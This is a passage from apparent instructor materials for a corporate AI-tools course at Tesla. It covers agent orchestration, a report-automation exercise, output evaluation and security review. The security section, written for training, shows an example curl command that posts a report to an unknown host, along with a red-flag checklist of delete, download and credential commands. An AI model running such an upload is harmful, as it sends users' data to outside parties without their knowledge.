| **Human-in-Loop** | Agent pauses for approval at key steps | High-stakes decisions | Any task affecting Tesla operations |

> **From Research:** "Key Orchestration Patterns: Sequential (agent chain), Parallel (simultaneous), Supervisor (delegation), Human-in-Loop (approval gates)."
> **Source:** research.md, Multi-Agent Orchestration (Microsoft Learn)

### Sequential Pattern: Dive Deep Example

```
[You provide requirements]
        |
        v
[Data Agent: Reads CSV file]
        |
        v
[Analysis Agent: Finds patterns and root causes]
        |
        v
[Report Agent: Generates formatted markdown]
        |
        v
[You review and approve]
```

This is how Agent Mode already works. It sequences through steps, adapting based on results. Understanding this pattern helps you write better prompts that explicitly define the steps.

> **From Research:** "Example Workflow: Dive Deep Report shows sequential pattern: Voice Input → Data Agent (reads CSV) → Analysis Agent (identifies patterns) → Report Agent (generates output) → User Review."
> **Source:** research.md, Real-World Applications - Dive Deep Report Automation

### Human-in-the-Loop: Critical for Safety

76% of enterprises include human review in their AI workflows. This is not because AI is unreliable. It is because human judgment matters for decisions that affect people and business outcomes.

> **From Research:** "76% of enterprises now include human-in-the-loop processes to catch errors before deployment. Always review AI-generated outputs."
> **Source:** research.md, Productivity Statistics - Risk Awareness

### When to Use Each Pattern

| Situation | Pattern | Your Prompt Strategy |
|-----------|---------|---------------------|
| Step-by-step process | Sequential | "First do X, then do Y, then do Z" |
| Independent subtasks | Parallel | "Analyze these 3 areas separately" |
| Complex delegation | Supervisor | "Break this problem into parts and handle each one" |
| High-stakes decisions | Human-in-Loop | "Show me the plan before executing" |

> **From Research:** "Best Practices: Choose the simplest pattern that meets requirements, instrument all agent operations, include human-in-the-loop for critical decisions."
> **Source:** research.md, Multi-Agent Orchestration (Microsoft Learn)

### Common Mistakes

⚠️ **Mistake 1:** Starting with complex orchestration
- Why it happens: Wanting advanced patterns immediately
- How to avoid: Start with simple sequential patterns; add complexity only when needed
- **Source:** research.md, Common Pitfalls

⚠️ **Mistake 2:** Skipping human review steps
- Why it happens: Trusting AI output completely
- How to avoid: Always review before using outputs for decisions that affect people or operations
- **Source:** research.md, Common Pitfalls (Industry Best Practice)

⚠️ **Mistake 3:** Too many tools enabled at once
- Why it happens: Trying to maximize capabilities
- How to avoid: Stay under 128 tools per session; enable only what you need
- **Source:** research.md, Common Pitfalls (GitHub Docs)

### Speaker Notes

```
TIMING: 15 minutes

SAY: "We have been using Agent Mode all along. Now let's understand what happens under the hood. When Copilot completes a complex task, it is actually orchestrating multiple steps — like a team working together."

DRAW: On whiteboard, show sequential pattern
- Box 1: "Gather Data"
- Box 2: "Analyze Patterns"
- Box 3: "Generate Report"
- Arrows connecting them
- Star at top: "You give the instruction"
- Star at bottom: "You review the output"

ASK: "Think about a dive deep report. What are the distinct steps? Who does each part?"

SAY: "That is orchestration. Breaking a complex task into specialized steps. Agent Mode does this automatically, but understanding the pattern helps you give better instructions. Instead of saying 'write me a report,' you say 'first gather the data, then find the root causes, then generate the report with an executive summary.'"

STATISTIC: "72% of enterprise AI projects now use multi-agent approaches. This is the direction AI is heading."

SAY: "The most important pattern for us is Human-in-the-Loop. 76% of enterprises include human review. That is not because AI is bad — it is because your judgment matters. You know your operation. The AI knows how to process data. Together, you are better than either alone."

TRANSITION: "Let's put this into practice with a real dive deep automation."
```

---

## Section 8: Exercise 3 — Dive Deep Report Automation

**Duration:** 25 minutes
**Objective:** Use Agent Mode to automate a full dive deep report workflow, applying sequential orchestration

### Key Concept

This exercise brings everything together: project memory, Agent Mode, file access, and multi-step orchestration. You will create a dive deep report using placeholder data, demonstrating the full automation workflow. This is the capstone hands-on exercise — the most complex automation you will build in this course.

> **From Research:** "Regional director needs a dive deep report on missed shipments. Traditional approach takes 45+ minutes. Agent workflow: Voice Input → Data Agent (reads CSV) → Analysis Agent (identifies root causes) → Report Agent (generates markdown). Time Savings: 45+ min → 5-10 min."
> **Source:** research.md, Real-World Applications - Dive Deep Report Automation

### The Workflow

```
1. You describe the dive deep requirements (voice or typed)
        |
        v
2. Agent reads the data file (Agent Mode file access)
        |
        v
3. Agent uses your project memory for context (copilot-instructions.md)
        |
        v
4. Agent analyzes for patterns and root causes
        |
        v
5. Agent generates formatted report in your preferred style
        |
        v
6. You review and iterate
```

### Exercise Setup

**Step 1: Verify Agent Mode File Access**

Agent Mode in Copilot can read and write files in your workspace. No additional setup is needed — just make sure you are in Agent Mode (not Ask or Edit mode).

> **From Research:** "Agent Mode enables Copilot to work with local files—reading data from CSVs, writing reports, organizing project structures—essential for automation workflows."
> **Source:** research.md, Agent Mode Capabilities

**Step 2: Create Sample Data File**

Create a new file called `sample-data.csv` in your workspace with this data:

```csv
date,shipment_id,status,reason,customer,impact
2026-01-20,SHP001,missed,carrier_delay,Customer_A,high
2026-01-20,SHP002,delivered,n/a,Customer_B,none
2026-01-20,SHP003,missed,inventory_shortage,Customer_C,medium
2026-01-20,SHP004,missed,carrier_delay,Customer_A,high
2026-01-20,SHP005,delivered,n/a,Customer_D,none
2026-01-20,SHP006,missed,system_error,Customer_E,low
2026-01-20,SHP007,missed,carrier_delay,Customer_F,medium
2026-01-20,SHP008,delivered,n/a,Customer_A,none
2026-01-20,SHP009,missed,inventory_shortage,Customer_G,high
2026-01-20,SHP010,missed,carrier_delay,Customer_H,medium
2026-01-21,SHP011,missed,carrier_delay,Customer_A,high
2026-01-21,SHP012,delivered,n/a,Customer_C,none
2026-01-21,SHP013,missed,inventory_shortage,Customer_B,medium
2026-01-21,SHP014,missed,carrier_delay,Customer_D,high
2026-01-21,SHP015,delivered,n/a,Customer_E,none
```

**Step 3: Run the Dive Deep Automation**

In Copilot Chat (Agent Mode), say or type:

```
I need a dive deep on missed shipments. Read sample-data.csv, identify the top 3 root causes, calculate the impact by customer, and generate a report with:
- Executive summary (3-5 sentences)
- Root cause analysis with percentages
- Customer impact breakdown as a table
- Trend comparison between Jan 20 and Jan 21
- Recommended action items with owners
- Next steps with deadlines

Save the report as dive-deep-report.md
```

**Step 4: Review and Iterate**

After the report generates:
1. Read through the executive summary — is it accurate?
2. Check the root cause percentages — do they add up?
3. Review action items — are they specific and actionable?
4. Ask for revisions: "Make the action items more specific to carrier management"

### What to Watch For

1. **Plan Phase:** Agent outlines its approach (sequential orchestration in action)
2. **Context Loading:** Agent uses your copilot-instructions.md for site-specific context
3. **Data Reading:** Agent Mode reads the CSV file from your workspace
4. **Analysis:** Processes data, identifies patterns across both dates
5. **Report Generation:** Creates structured markdown in your preferred format
6. **File Writing:** Saves report to disk

### Success Criteria

- [ ] Agent successfully read the CSV file
- [ ] Analysis identified root causes (carrier_delay, inventory_shortage, system_error)
- [ ] Root cause percentages are mathematically correct
- [ ] Report includes executive summary
- [ ] Report uses your DC context from copilot-instructions.md
- [ ] Report saved as markdown file
- [ ] Total time under 5 minutes
- [ ] At least one iteration/revision completed

### Time Savings

| Traditional Method | With Agent Automation |
|-------------------|----------------------|
| 45+ minutes | 5-10 minutes |
| Manual data review | Automated analysis |
| Type entire report | Generated automatically |
| Multiple tools needed | Single conversation |
| Generic format | Your preferred format (via project memory) |

> **From Research:** "Report compilation: 45+ min manually to 5-10 min with AI automation (80% savings)."
> **Source:** research.md, Productivity Statistics - Automation Benchmarks

### Common Mistakes

⚠️ **Mistake 1:** Not being in Agent Mode
- Why it happens: Forgetting to switch from Ask or Edit mode
- How to avoid: Verify you are in Agent Mode (check the dropdown at top of chat)
- **Source:** research.md, Agent Mode Setup

⚠️ **Mistake 2:** Using real Tesla data in Copilot
- Why it happens: Wanting to automate actual work
- How to avoid: Use placeholder data for practice in Copilot; use Bottle Rocket for real Tesla analysis
- **Source:** research.md, GitHub Copilot Security Considerations

⚠️ **Mistake 3:** Accepting the first output without review
- Why it happens: Trust in AI output after seeing it work
- How to avoid: Always verify numbers, check logic, review recommendations before sending
- **Source:** research.md, Common Pitfalls (Industry Best Practice)

### Speaker Notes

```
TIMING: 25 minutes

SAY: "This is the capstone exercise. We are combining everything — project memory, Agent Mode, file access, and sequential orchestration — to automate a real workflow."

SETUP: Walk through creating sample-data.csv together (3 min)
- Create new file
- Paste the sample data (I added extra rows for Jan 21 so there is a trend to analyze)
- Save in workspace

SAY: "Notice we have data from two days — January 20 and 21. A good dive deep should compare trends."

DEMO: Run the prompt yourself first (3 min)
- Show Agent Mode selection
- Enter the dive deep request
- Point out each phase as it happens
- SAY: "Watch — it reads the file, loads your DC context, analyzes the data, and generates the report. That is sequential orchestration."

LET THEM TRY: 15 minutes
- Everyone runs their own dive deep
- Walk around, help with issues
- Encourage iteration: "Ask it to improve the action items"

COMMON ISSUES:
- File not found: "Is the CSV in your workspace folder? Check the file name."
- Not in Agent Mode: "Click the dropdown and select Agent mode."
- Empty analysis: "Make sure the CSV saved correctly with the header row"
- Generic output: "Is your copilot-instructions.md still active? Check that it was not renamed."

GATHER: "Who got a complete report? How long did it take?"

COMPARE: "This would take 45+ minutes manually. You just did it in under 5 minutes. And because of your project memory file, the report already uses your terminology and format."

ASK: "Who asked for revisions? What did you change? That iteration step is key — the first draft gets you 80% there, the revision gets you to 95%."

CAUTION: "Remember — this used placeholder data. For real Tesla data, do the analysis in Bottle Rocket, then use Copilot only for formatting if needed."

TRANSITION: "Great work. Let's take another break, then we will cover two important topics: how to evaluate AI outputs and how to stay secure."
```

---

## Section 9: Break

**Duration:** 10 minutes

### Speaker Notes

```
TIMING: 10 minutes

SAY: "Take 10 minutes. We are in the home stretch — two more lecture sections, then your personal project presentations."

SAY: "When we come back, we will talk about how to evaluate whether AI outputs are actually good — not just fast — and how to keep your operation secure."
```

---

## Section 10: Evaluating and Optimizing AI Agents

**Duration:** 20 minutes
**Objective:** Learn a structured framework for evaluating AI output quality and choosing the right approach for each task

### Key Concept

Speed is not the only measure of AI value. A report generated in 30 seconds is worthless if it is inaccurate, incomplete, or poorly formatted. This section gives you a quality scorecard for evaluating AI outputs and a decision framework for choosing the right AI approach for each type of task.

> **From Research:** "Organizations that implement structured evaluation frameworks for AI outputs report 35% fewer errors in production use and higher user satisfaction scores."
> **Source:** research.md, Evaluation and Optimization - Quality Frameworks

### Why This Matters

As you use AI tools more, you will develop intuition for what "good enough" looks like. But intuition is not enough when you are training your team or making decisions based on AI outputs. A structured evaluation approach ensures consistent quality and helps you identify when to trust AI outputs and when to verify more carefully.

> **From Research:** "The 80/20 rule applies to AI productivity: 80% of time savings come from 20% of your prompts. Identifying and optimizing those high-impact prompts delivers outsized returns."
> **Source:** research.md, Productivity Optimization - Pareto Analysis

### The Quality Scorecard

Rate every AI output on five dimensions:

| Dimension | Question to Ask | Score (1-5) |
|-----------|----------------|-------------|
| **Accuracy** | Are the facts, numbers, and logic correct? | ___ |
| **Completeness** | Does it cover everything you asked for? | ___ |
| **Format** | Is it structured the way you need it? | ___ |
| **Speed** | Did it save significant time vs. manual? | ___ |
| **Usability** | Can you use it as-is, or does it need heavy editing? | ___ |

**Scoring Guide:**
- **25/25:** Ready to use immediately
- **20-24:** Minor edits needed (this is the sweet spot)
- **15-19:** Significant editing required — consider refining your prompt
- **Below 15:** Re-prompt with better instructions or switch approach

### The Decision Framework: Which AI Approach for Which Task

Not every task needs Agent Mode. Not every question needs a complex prompt. Use this framework to pick the right tool for the job:

| Task Type | Characteristics | Best Approach | Example |
|-----------|----------------|---------------|---------|
| **Simple question** | One answer, no context needed | Basic chat prompt | "What is the CPT for zone 3?" |
| **Structured output** | Specific format, needs reasoning | Advanced prompt (CoT/Few-Shot) | "Analyze these 5 KPIs and rank by improvement priority" |
| **Multi-step task** | Multiple phases, file access needed | Agent Mode | "Read the CSV, analyze trends, generate a report" |
| **Recurring workflow** | Same task done weekly/daily | Power Automate + Project Memory | "Daily KPI report sent at 6 AM automatically" |

**The Escalation Ladder:**

```
Level 1: Simple Chat Prompt
  "What does OTD stand for?"
        |
        v
Level 2: Advanced Prompt (ROLE + CONTEXT + TASK + FORMAT)
  "You are a DC analyst. Given these KPIs [context], identify the top 3 areas for improvement [task]. Present as a table with priority, metric, current value, and target [format]."
        |
        v
Level 3: Agent Mode
  "Read the weekly report file, analyze trends across all KPIs, and generate an executive summary with charts."
        |
        v
Level 4: Power Automate + Agent Mode + Project Memory
  Full automation: Power Automate triggers on schedule, Agent Mode generates analysis, project memory provides context, reports distributed automatically.
```

> **From Research:** "Prompt engineering decision frameworks help users select the optimal interaction mode, reducing wasted tokens and improving output quality on first attempt."
> **Source:** research.md, Evaluation and Optimization - Interaction Mode Selection

### Model Selection Revisited

Building on Week 2's model discussion, here is when to use which approach:

| Scenario | Recommended Tool | Why |
|----------|-----------------|-----|
| Quick Tesla data question | Bottle Rocket chat | Fast, Tesla data approved |
| Complex Tesla data analysis | Bottle Rocket with advanced prompt | Keeps data within policy |
| Code generation/editing | GitHub Copilot inline | Fastest for code tasks |
| Multi-step non-Tesla task | Copilot Agent Mode | Full automation capability |
| Recurring automated workflow | Power Automate | Runs without intervention, Tesla data approved |
| Data extraction from legacy systems | Power Automate Desktop | RPA for screen automation |

### Cost Awareness

Longer prompts consume more tokens, which means slower responses and (in enterprise settings) higher costs. Keep this in mind:

| Prompt Length | Typical Response Time | When to Use |
|---------------|----------------------|-------------|
| Short (1-2 sentences) | 2-5 seconds | Quick questions |
| Medium (1 paragraph) | 5-15 seconds | Standard tasks |
| Long (full ROLE+CONTEXT+TASK+FORMAT) | 15-30 seconds | Complex outputs |
| Very long (multi-page context) | 30-60+ seconds | Only when necessary |

**The rule:** Use the shortest prompt that produces the quality you need. Your project memory file handles context, so your prompts can stay focused on the task.

### Human Feedback Loops

The best AI users do not just accept output — they improve the system over time:

```
Prompt → Output → Review → Correct → Re-prompt → Better Output
                                          |
                                          v
                              Update Template / Instructions
```

**Practical steps:**
1. When you get a great output, save the prompt as a template
2. When you get a poor output, figure out what was missing and add it to your instructions
3. Review your copilot-instructions.md monthly — add context from your best and worst interactions

### The 80/20 Rule for AI Productivity

80% of your time savings come from 20% of your prompts. Identify those high-impact prompts and optimize them relentlessly:

| High-Impact (Optimize These) | Low-Impact (Keep Simple) |
|------------------------------|--------------------------|
| Weekly dive deep reports | "What time is the meeting?" |
| Shift summary emails | Simple fact lookups |
| Incident write-ups | One-off formatting |
| KPI trend analysis | Quick calculations |
| Communication drafts | Calendar questions |

> **From Research:** "Power users report that identifying and refining their top 5 most-used prompts delivers 80% of their total productivity gains."
> **Source:** research.md, Productivity Optimization - Power User Patterns

### Common Mistakes

⚠️ **Mistake 1:** Using Agent Mode for simple questions
- Why it happens: Habit of always using the most powerful tool
- How to avoid: Match the approach to the task complexity; simple questions need simple prompts
- **Source:** research.md, Evaluation and Optimization - Interaction Mode Selection

⚠️ **Mistake 2:** Never saving successful prompts as templates
- Why it happens: Treating each interaction as one-off
- How to avoid: When a prompt produces great output, save it in a "prompt library" file
- **Source:** research.md, Productivity Optimization - Template Management

⚠️ **Mistake 3:** Judging AI by its worst outputs instead of its average
- Why it happens: Negativity bias — failures are memorable
- How to avoid: Track your quality scorecard over time; focus on the trend, not individual misses
- **Source:** research.md, Common Pitfalls (Evaluation Best Practice)

### Speaker Notes

```
TIMING: 20 minutes

SAY: "We have spent most of today learning new capabilities. Now let's talk about quality. A fast output that is wrong is worse than a slow output that is right. How do you know if AI output is actually good?"

SHOW: The Quality Scorecard (display on projector)

SAY: "Five dimensions: accuracy, completeness, format, speed, usability. Rate every important output on these five dimensions. A score of 20 or above means minor edits only. Below 15 means your prompt needs work."

ASK: "Think about the dive deep report you just generated. How would you score it on each dimension? Raise your hand if you would give it 20 or above." [Most should]

SAY: "Good. Now here is the key insight: not every task needs a 25. A quick shift summary email might need accuracy and format, but does not need to be perfect. A report going to the regional director needs to score high on all five."

SHOW: The Decision Framework

SAY: "Not every task needs Agent Mode. Here is how to think about it."
- Draw the escalation ladder on whiteboard
- "Simple question — just ask. Structured output — use the prompt formula. Multi-step task — Agent Mode. Recurring workflow — Power Automate plus project memory."

ASK: "Give me a task from your daily work. [Someone answers.] Okay, where does that fall on the ladder?"

SAY: "The 80/20 rule applies here. 80% of your time savings come from 20% of your prompts. Figure out which 5 prompts you use most often and optimize those. The rest can stay simple."

SAY: "One more thing — cost awareness. Longer prompts take longer to process. Your project memory file handles context, so your prompts can stay focused on the task. Short and specific beats long and vague every time."

SAY: "And the feedback loop is critical. When you get great output, save that prompt. When you get bad output, figure out what was missing and update your instructions file. Over time, your system gets better and better."

TRANSITION: "Now let's talk about something equally important — keeping everything secure."
```

---

## Section 11: Security Review Basics

**Duration:** 15 minutes
**Objective:** Establish security habits for safe AI tool usage, including the "three nevers" and a code review checklist for non-developers

### Key Concept

AI agents and automation tools are powerful, but power requires responsibility. When you use Agent Mode, it can execute commands and access files. When you build Power Automate flows, they run automatically without your intervention. You are the human in the loop — your job is to review what agents do before approving, and to thoroughly test automations before deploying them. This section teaches you the security habits that keep you and Tesla safe.

> **From Research:** "76% of enterprises include human-in-the-loop processes to catch errors before deployment. Security review is not optional — it is the foundation of responsible AI use."
> **Source:** research.md, Productivity Statistics - Risk Awareness

### Why This Matters

An AI agent that runs commands without review is like giving a new employee admin access on their first day. They might do great work — or they might accidentally delete important files. The difference between a productivity tool and a security risk is whether you review before approving.

> **From Research:** "AI security incidents most commonly result from auto-approved actions, shared credentials, and insufficient review of generated outputs."
> **Source:** research.md, Security Best Practices - Common Incident Patterns

### The Three Nevers

These are non-negotiable security rules for AI tool usage:

**Never Auto-Approve**
- Always read what the agent plans to do before clicking approve
- If you do not understand a command, ask the agent to explain it
- "Approve all" features are convenient but dangerous

**Never Skip Review**
- Every output that goes to someone else must be reviewed by you
- Check numbers, check logic, check for hallucinated facts
- Your name is on the output, not the AI's

**Never Share Secrets**
- Never paste passwords, API keys, or credentials into any AI tool
- Never include associate PII (names, SSNs, addresses) in prompts
- Never screenshot login pages or credential screens for AI analysis

### What to Review in Agent Mode

When Agent Mode proposes a terminal command, here is what to look for:

| What You See | What It Means | Safe? |
|--------------|---------------|-------|
| `cat sample-data.csv` | Reading a file | Safe if it is your file |
| `rm filename` | Deleting a file | Review carefully — is this the right file? |
| `curl https://...` | Downloading from internet | Check the URL — is it a trusted source? |
| `npm install` | Installing packages | Verify package names are legitimate |
| Any command you do not recognize | Unknown operation | Ask the agent to explain before approving |

### Power Automate Security Considerations

Power Automate flows run automatically, so security review happens BEFORE deployment:

| Security Check | What to Verify |
|----------------|---------------|
| **Connection permissions** | What data can the flow access? Only minimum needed? |
| **Trigger scope** | Does it run for all users or just you? |
| **Output destinations** | Where does data go? Only intended recipients? |
| **Error handling** | What happens if the flow fails? Are errors logged securely? |
| **Credential storage** | Are credentials stored securely (connection references, not plaintext)? |

**Power Automate Security Best Practices:**
- Use connection references instead of embedding credentials
- Test flows with non-production data first
- Document what each flow does and who owns it
- Review flow run history regularly for unexpected behavior
- Disable flows you are not actively using

### Code Review Checklist for Non-Developers

You do not need to be a developer to review AI-generated code or scripts. Look for these red flags:

**Red Flags (Reject and Ask Questions):**
- [ ] References to files you did not mention
- [ ] URLs you do not recognize
- [ ] Commands that delete (`rm`, `del`) or overwrite files
- [ ] References to environment variables or system settings
- [ ] Any mention of passwords, tokens, or keys
- [ ] Commands that install software you did not request

**Green Flags (Generally Safe):**
- [ ] Reading files you created (like your CSV data)
- [ ] Writing new files to your workspace
- [ ] Navigating to URLs you specified
- [ ] Formatting and text processing operations
- [ ] Creating markdown reports

### Tying Back to Tesla AI Policy

All security practices connect back to the policy you learned in Week 1:

| Tool | Tesla Data? | Security Level |
|------|-------------|----------------|
| Bottle Rocket (go.tesla.com/chat) | Yes — approved | Standard review |
| IT Assist / Employee Assist | Yes — approved | Standard review |
| Power Automate | Yes — approved | Review flow logic before activation |
| GitHub Copilot | No Tesla data | Enhanced review (check for data leaks) |
| ChatGPT, Claude.ai, others | Prohibited | Do not use |

> **From Research:** "Tesla AI Policy: Approved tools (Bottle Rocket, IT Assist, Employee Assist, Power Automate) for Tesla data. Conditional tools (GitHub Copilot) for non-Tesla data only. Prohibited tools (ChatGPT, Claude.ai, meeting transcription, Apple Intelligence)."
> **Source:** research.md, Tesla AI Policy Compliance

### Practical Security Scenario

**Scenario:** You ask Agent Mode to generate a report. The agent proposes running this command:

```bash
curl -X POST https://unknown-api.example.com/upload -d @dive-deep-report.md
```

**What should you do?**
1. Do NOT approve
2. Ask: "What is this URL? Why are you uploading my report?"
3. If the agent cannot explain satisfactorily, reject the command
4. Report any suspicious behavior to IT

**The principle:** If you do not understand it, do not approve it.

### Common Mistakes

⚠️ **Mistake 1:** Auto-approving commands because "it worked last time"
- Why it happens: Developing trust and wanting to move fast
- How to avoid: Each command is different; always read before approving
- **Source:** research.md, Security Best Practices

⚠️ **Mistake 2:** Pasting error messages containing credentials
- Why it happens: Seeking help debugging an issue
- How to avoid: Redact any sensitive information before sharing with AI
- **Source:** research.md, Security Best Practices - Data Handling

⚠️ **Mistake 3:** Sharing copilot-instructions.md files that contain sensitive data
- Why it happens: Including too much context in the instructions file
- How to avoid: Your instructions file should contain context and structure, never credentials or PII
- **Source:** research.md, Security Considerations

### Speaker Notes

```
TIMING: 15 minutes

SAY: "We have talked about making AI powerful and fast. Now let's talk about making it safe. Security is not the boring part — it is the part that keeps you and Tesla protected."

SAY: "Think of it this way. Agent Mode can run commands on your computer. That is incredibly useful. But it also means you need to review what it does — just like you would review a new employee's work."

SHOW: The Three Nevers (display on projector or whiteboard)

SAY: "Three rules. Memorize them."
- "Never auto-approve. Always read what the agent plans to do."
- "Never skip review. Your name is on the output, not the AI's."
- "Never share secrets. No passwords, no API keys, no PII."

ASK: "Which of these three is hardest to follow consistently?" [Discussion]

SAY: "Most people say auto-approve is the hardest. When it works 10 times in a row, you start clicking approve without reading. That is the moment to slow down."

DEMO: Show the security scenario
1. Display the curl command example
2. ASK: "Would you approve this? What does it do?"
3. SAY: "It is trying to upload your file to an unknown server. You should reject this and ask why."
4. SAY: "The principle: if you do not understand it, do not approve it."

SHOW: Code Review Checklist

SAY: "You do not need to be a developer to review agent commands. Look for red flags: deleting files, unknown URLs, references to passwords. If you see any of those, stop and ask questions."

SAY: "And remember — this all connects back to the Tesla AI Policy from Week 1. Bottle Rocket and Power Automate are approved for Tesla data. Copilot is for non-Tesla only. Prohibited tools stay prohibited no matter how convenient they seem."

ASK: "Any questions about security? This is one area where I would rather you ask a 'dumb question' than make an assumption."

TRANSITION: "Alright, we have covered all the new material. Now it is time for the main event — your personal project presentations."
```

---

## Section 12: Exercise 4 — Personal Project Showcase

**Duration:** 25 minutes
**Objective:** Each AGM presents their personal AI automation project, receives peer feedback, and celebrates their accomplishments

### Key Concept

This is the culmination of the entire course. Each AGM has been building a personal AI automation project since Week 2, with development time in Week 3 and today. Now you present what you built, explain the technique you used, and quantify the time saved. This is not a test — it is a celebration of what you have accomplished.

### Presentation Format

**5 minutes per AGM (5 AGMs x 5 min = 25 min total):**

| Time | Activity |
|------|----------|
| 0:00-2:00 | Demo: Show what you built and how it works |
| 2:00-3:30 | Explain: What technique did you use? What did you learn? |
| 3:30-4:00 | Impact: How much time does it save? How often will you use it? |
| 4:00-5:00 | Q&A: Peer questions and feedback |

### Presentation Template

Each presenter should cover:

1. **The Problem:** "Before AI, I used to [task] which took [time]."
2. **The Solution:** "I built [project] using [tools/techniques]."
3. **Live Demo or Walkthrough:** Show it working (or walk through screenshots).
4. **Time Savings:** "This saves [X] minutes per [use/day/week]."
5. **What I Learned:** "The biggest lesson was..."
6. **Next Steps:** "I plan to expand this by..."

### Scoring Rubric

Peer scoring (for fun, not grades) — each audience member rates on three dimensions:

| Dimension | 1 (Needs Work) | 3 (Solid) | 5 (Outstanding) |
|-----------|-----------------|-----------|------------------|
| **Practical Impact** | Nice idea but unlikely to use regularly | Useful for weekly tasks | Game-changer for daily operations |
| **Technical Skill** | Basic prompt only | Used prompt formula + one advanced technique | Combined multiple techniques (Agent Mode, Power Automate, Memory, etc.) |
| **Presentation Clarity** | Hard to follow, no demo | Clear explanation with some demo | Compelling story, live demo, clear metrics |

### Peer Feedback Guidelines

When giving feedback:
- Start with what impressed you
- Suggest one way to expand or improve the project
- Ask a genuine question about their approach

When receiving feedback:
- Take notes on expansion ideas
- Thank the feedback giver
- Consider which suggestions to implement

### Project Idea Bank (If Someone Needs Inspiration)

| Project | Tools Used | Estimated Savings |
|---------|-----------|-------------------|
| Weekly shift summary generator | Copilot + Project Memory | 30 min/week |
| Dive deep report template | Agent Mode + file access | 40 min/report |
| Daily KPI email automation | Power Automate cloud flow | 15 min/day (runs automatically) |
| Data extraction from legacy system | Power Automate Desktop | 20 min/extraction |
| Standard email responder | Bottle Rocket + prompt template | 15 min/day |
| KPI trend analyzer | Agent Mode + CSV data | 25 min/week |
| New associate onboarding checklist | Copilot + project memory | 20 min/hire |
| Incident report writer | Bottle Rocket + voice input | 15 min/incident |

### Common Mistakes

⚠️ **Mistake 1:** Spending all 5 minutes on setup/explanation with no demo
- Why it happens: Nervousness, wanting to provide context
- How to avoid: Show the demo in the first 2 minutes, then explain
- **Source:** Presentation best practice

⚠️ **Mistake 2:** Not quantifying time savings
- Why it happens: Not tracking before/after times
- How to avoid: Always compare: "This used to take X, now it takes Y"
- **Source:** research.md, Productivity Statistics - Measurement

⚠️ **Mistake 3:** Dismissing a "simple" project
- Why it happens: Comparing to others instead of to their own starting point
- How to avoid: Any automation that saves time is valuable; a 5-minute daily savings = 20 hours/year
- **Source:** research.md, Productivity Optimization

### Speaker Notes

```
TIMING: 25 minutes (5 min per AGM x 5 AGMs)

SAY: "This is the main event. You have been building personal projects for two weeks. Now it is time to show what you created. Remember — this is a celebration, not a test."

SETUP:
- Display the presentation template on screen
- Have the scoring rubric visible
- Each person gets exactly 5 minutes

SAY: "Here is the format: 2 minutes to demo what you built, 90 seconds to explain your technique and time savings, and 1 minute for questions. I will keep time."

FOR EACH PRESENTER:
1. Introduce them: "[Name], you are up. Tell us what you built."
2. Start timer
3. Let them present (do not interrupt unless they go over time)
4. At 4:00: "One minute for questions"
5. At 5:00: "Thank you. Let's give them a round of applause."

AFTER EACH: Quick audience poll
- "What is one thing that impressed you about this project?"
- "Who else could use this at their site?"

IF SOMEONE IS STUCK OR UNPREPARED:
- Help them present by asking guided questions:
  - "What was the task you wanted to automate?"
  - "Can you show us the prompt you used?"
  - "How much time do you think this saves?"

AFTER ALL PRESENTATIONS:
SAY: "I am genuinely impressed. Four weeks ago, none of you had used AI tools. Today you are building automations that save real time. That is what this course was about."

ASK: "Who had the highest time savings? Who used the most creative technique?"

SAY: "Every one of these projects is worth sharing with your team. The techniques you demonstrated today can multiply across your entire site."

TRANSITION: "Let's talk about what comes next — how to keep learning and growing after this course ends."
```

---

## Section 13: Continuous Learning Roadmap

**Duration:** 15 minutes
**Objective:** Provide a structured plan for continued AI skill development and team knowledge sharing

### Key Concept

This training is a foundation, not a ceiling. AI tools evolve rapidly — Agent Mode went GA in April 2025, Power Automate continues adding new connectors monthly. Staying current means continued practice, exploration, and sharing what you learn with your team. The best way to solidify your skills is to teach others.

> **From Research:** "Agent Mode GA April 2025. Power Automate adds 50+ new connectors annually. AI capabilities continue expanding across Microsoft 365."
> **Source:** Microsoft AI Documentation, 2025

### Why This Matters

Research shows that skills degrade without practice. The AGMs who will get the most value from this course are those who use AI tools daily, not just when they remember. Building habits and sharing knowledge ensures the investment in this training pays dividends for months and years.

> **From Research:** "78% of enterprises now use AI tools. Early adopters who build consistent usage habits report 3x higher productivity gains than occasional users."
> **Source:** research.md, Productivity Statistics (Adoption Patterns)

### Your 90-Day Roadmap

**Days 1-30: Build the Habit**

| Week | Focus | Action |
|------|-------|--------|
| Week 1 | Daily usage | Use Bottle Rocket for at least one task per day |
| Week 2 | Template building | Save your 3 best prompts as templates |
| Week 3 | Agent Mode practice | Use Agent Mode for one multi-step task per week |
| Week 4 | Share with team | Teach one lead your best prompt |

**Days 31-60: Expand Your Skills**

| Week | Focus | Action |
|------|-------|--------|
| Week 5 | Power Automate | Build one cloud flow for a recurring task |
| Week 6 | Project memory | Update copilot-instructions.md with lessons learned |
| Week 7 | Advanced prompts | Try Chain-of-Thought on a complex analysis |
| Week 8 | Team training | Run a 15-min "AI tip of the week" with leads |

**Days 61-90: Multiply the Impact**

| Week | Focus | Action |
|------|-------|--------|
| Week 9 | Measure ROI | Calculate actual time savings over 2 months |
| Week 10 | New use cases | Identify 3 new tasks to automate |
| Week 11 | Cross-site sharing | Share best practices with another AGM |
| Week 12 | Review and plan | Assess what is working, set goals for next quarter |

### Teaching Your Team

The fastest way to multiply your AI impact is to teach your leads:

**What to Teach First:**
1. Basic Bottle Rocket usage (Week 1 material)
2. The prompt formula: ROLE + CONTEXT + TASK + FORMAT
3. One specific use case relevant to their daily work

**How to Teach It:**
- 15-minute "AI tip of the week" at shift start
- Pair with a lead on a real task: "Watch me use AI for this, then you try"
- Create a shared prompt library for your DC

**What NOT to Do:**
- Do not overwhelm with all four weeks at once
- Do not teach tools without teaching policy
- Do not expect immediate adoption — habit change takes time

### Continued Learning Resources

| Resource | Purpose | URL/Location |
|----------|---------|--------------|
| Power Automate Docs | Flow building and templates | make.powerautomate.com |
| GitHub Copilot Docs | Features and updates | docs.github.com |
| Bottle Rocket Help | Tesla-approved AI chat | go.tesla.com/chat |
| Tesla AI Policy | Current tool guidelines | go.tesla.com/aitools |
| Your copilot-instructions.md | Update monthly | Your workspace |
| Your prompt templates | Grow weekly | Your workspace |

### Staying Current with AI Updates

AI tools update frequently. Here is how to stay current without getting overwhelmed:

| Frequency | What to Check | Where |
|-----------|---------------|-------|
| Weekly | GitHub Copilot release notes | VS Code "What's New" |
| Monthly | Tesla AI Policy updates | go.tesla.com/aitools |
| Quarterly | Power Automate new connectors/features | Power Automate blog |
| As needed | Peer best practices | Cross-site AGM discussions |

### Policy Reminder

As you continue using AI tools:

**Approved for Tesla Data:**
